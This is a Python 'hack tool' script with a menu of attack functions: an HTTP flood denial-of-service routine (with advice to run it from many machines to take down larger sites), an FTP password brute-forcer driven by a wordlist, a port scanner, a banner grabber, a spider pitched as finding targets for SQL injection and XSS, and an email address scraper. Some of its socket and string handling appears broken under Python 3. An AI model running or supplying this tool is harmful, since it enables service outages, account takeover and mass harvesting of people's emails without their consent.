import socket
from datetime import datetime
import urllib.request
import urllib.error
import urllib.parse
import subprocess
import html2text
from random import randrange
from time import *
from string import *
import re
import platform


def dos(host):
    if operSys == "Windows":
        subprocess.call('cls', shell=True)
    if operSys == "Linux":
        subprocess.call('clear', shell=True)
    uagent = []
    uagent.append(
        "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
    uagent.append(
        "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0")
    uagent.append(
        "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
    uagent.append(
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
    uagent.append(
        "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")
    uagent.append(
        "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
    uagent.append(
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1")
    print("[*]This program will use HTTP FLOOD to dos the host.\n[*]It would work only on small websites if done only for one computer.\n[*]To take down larger websites run the attack from multiple computers.\n[*] For better performance open multiple instances of this software and attack at the same time.\n")
    print("[*]Host to attack: "+host)
    ip = socket.gethostbyname(host)
    print("[*]IP of the host: "+ip+"\n\n")
    conn = input(
        "Enter the number of packets to be sent(depends on the site but should be more than 2000 or 3000 for average sites): ")
    conn = int(conn)

    for i in range(conn):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        except:
            print("Unable to create Socket. Retrying.")
            continue
        random_index = randrange(len(uagent))
        try:
            s.connect((ip, 80))
        except:
            print("Unable To Connect. Retrying.")
            continue
        print("[*]FLOODING!")
        s.send("GET / HTTP/1.1\r\n")
        s.send("Host: "+host+"\r\n")
        s.send("User-Agent: "+uagent[random_index]+"\r\n\r\n")
        s.close()
    main()


def scanner(host):
    if operSys == "Windows":
        subprocess.call('cls', shell=True)
    if operSys == "Linux":
        subprocess.call('clear', shell=True)
    t1 = datetime.now()
    socket.setdefaulttimeout(2)
    print("[*] Scanning "+host)
    print("[*] Starting Scanning at "+str(t1))
    host = socket.gethostbyname(host)
    print("[*] IP of host: "+host)
    ports = [1, 5, 7, 18, 20, 21, 22, 23, 25, 43, 42, 53, 80, 109,
             110, 115, 118, 443, 194, 161, 445, 156, 137, 139, 3306]
    try:
        for port in ports:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            result = sock.connect_ex((host, port))
            if result == 0:
                print("Port {}: \t Open".format(port))
            sock.close()

    except KeyboardInterrupt:
        print("You pressed Ctrl+C")
        main()

    except socket.gaierror:
        print('Hostname could not be resolved. Exiting')
        main()

    except socket.error:
        print("Couldn't connect to server")
        main()
    t2 = datetime.now()
    timetaken = t2-t1
    print("[*] Scanning ended at: "+str(t2)+"\n")
    print("[*] Time taken= "+str(timetaken))
    main()


def banner(host):
    if operSys == "Windows":
        subprocess.call('cls', shell=True)
    if operSys == "Linux":
        subprocess.call('clear', shell=True)
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    except:
        "Error"
    host = socket.gethostbyname(host)
    port = input("[*] Enter the port of the service: ")
    try:
        s.connect((host, int(port)))
        print("[*] connection successfull\nWaiting for the banner...\n")
        if int(port) == 80:
            s.send('HEAD / HTTP/1.0\r\n\r\n')
        data = s.recv(1024)
        print("Banner:\n"+str(data))

        s.close()
    except:
        print("Connection failed")

    main()


def ftp(server):
    if operSys == "Windows":
        subprocess.call('cls', shell=True)
    if operSys == "Linux":
        subprocess.call('clear', shell=True)
    print("[*]Put the password file in the same directory.\n[*]The passwords should be on different lines.\n")
    passwords = []
    passw = input("Enter the password file name(eg: pass.txt, wordlist.txt): ")
    username = input("Enter the username to hack(eg: admin, root): ")
    f = open(str(passw))
    f = f.read()
    f = f.split('\n')
    for i in f:
        passwords.append(str(i))

    server = socket.gethostbyname(server)

    for password in passwords:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        except:
            print("Unable to create Socket.")
            main()
        try:
            s.connect((server, 21))
        except:
            print("Unable To Connect.")
            main()
        data = s.recv(1024)
        s.send('USER ' + username + '\r\n')
        data = s.recv(1024)
        s.send('PASS ' + password+'\r\n')
        print(data)
        data += " "+s.recv(1024)
        data += " "+s.recv(1024)
        s.send("Quit\r\n")
        s.close
        print("[*] Tried: "+password+"\n")
        if "230" in data:
            print("password found\n")
            print("[*] Password is: " + password)
            main()
        else:
            print('[*] '+password+" is incorrect")
    print("No password Found. Try another word list or username.")


def spider(host):
    if operSys == "Windows":
        subprocess.call('cls', shell=True)
    if operSys == "Linux":
        subprocess.call('clear', shell=True)
    spider1(host)
    main()


def spider1(host):
    print("[*] Use the result to find promising URLs/Emails to try hacking using SQL injection or Xss or Social Engineering etc.\n[*] Depth is the level to go inside the website( usually a small integer ).\n[*] Output will also be saved in text files in the same folder as this software.\n")
    depth = input("Enter the depth level in numbers: ")
    count = 1
    url = "http://"+host
    text = open("depth1.txt", "w+")
    for i in re.findall('''href=["'](.[^"']+)["']''', urllib.request.urlopen(url).read(), re.I):
        if "http" not in i:
            i = "http://"+host+i
        print(i)
        text.write(i+'\n')
    text.close()
    while(count < int(depth)):
        text = open("depth"+str(count)+".txt", "r")
        text1 = open("depth"+str(count+1)+".txt", "w+")
        f = text.read()
        if f == "":
            print("\n****Finished****")
            return depth
        f = f.split("\n")
        for j in f:
            if "http" not in j:
                j = "http://"+host+j

            try:
                for k in re.findall('''href=["'](.[^"']+)["']''', urllib.request.urlopen(j).read(), re.I):
                    print(k)
                    text1.write(k+"\n")
            except:
                continue
        text.close()
        text1.close()
        count += 1
    return depth


def email(host):
    if operSys == "Windows":
        subprocess.call('cls', shell=True)
    if operSys == "Linux":
        subprocess.call('clear', shell=True)
    depth = spider1(host)
    count = 1
    emails = open("emails.txt", "w+")
    print("[*] Email addresses found on page: ")
    while (count <= int(depth)):
        text = open("depth"+str(count)+".txt", "r")
        f = text.read()
        if f == "":
            print("\n****Finished****")
            main()
        f = f.split("\n")
        for j in f:
            try:
                e = urllib.request.urlopen(j)
            except:
                continue

            try:
                cont = html2text.html2text(e.read())
            except UnicodeDecodeError:
                try:
                    cont = html2text.html2text(
                        urllib.request.urlopen(j).read().decode('utf-8'))
                except:
                    try:
                        cont = urllib.request.urlopen(j).read()
                    except:
                        continue

            cont = cont.split('\n')
            for line in cont:
                if '@' in line:
                    print(line)
                    emails.write(line+"\n")

        count += 1
    main()


def main():
    print("-"*60+"\n")
    print("                  Dark Fantasy - Hack Tool                    ")
    print("-"*60+"\n")
    print("1.Port Scanning\n2.DDOS\n3.Banner Grabbing\n4.Web spider(gather all URLs for web hacking)\n5.FTP Password Cracker\n6.Email Scraping")
    choice = input("Enter Your Choice: ")
    hostname = input(
        "Enter Host Site or IP adress (www.google.com, www.yoursite.com, 192.168.1.1)(dont add http:// or https://): ")
    hostname = str(hostname)
    if choice == '1':
        scanner(hostname)
    elif choice == '6':
        email(hostname)
    elif choice == '3':
        banner(hostname)
    elif choice == '5':
        ftp(hostname)
    elif choice == '2':
        dos(hostname)
    elif choice == '4':
        spider(hostname)
    else:
        print("Wrong choice")


operSys = platform.system()
if __name__ == '__main__':
    main()
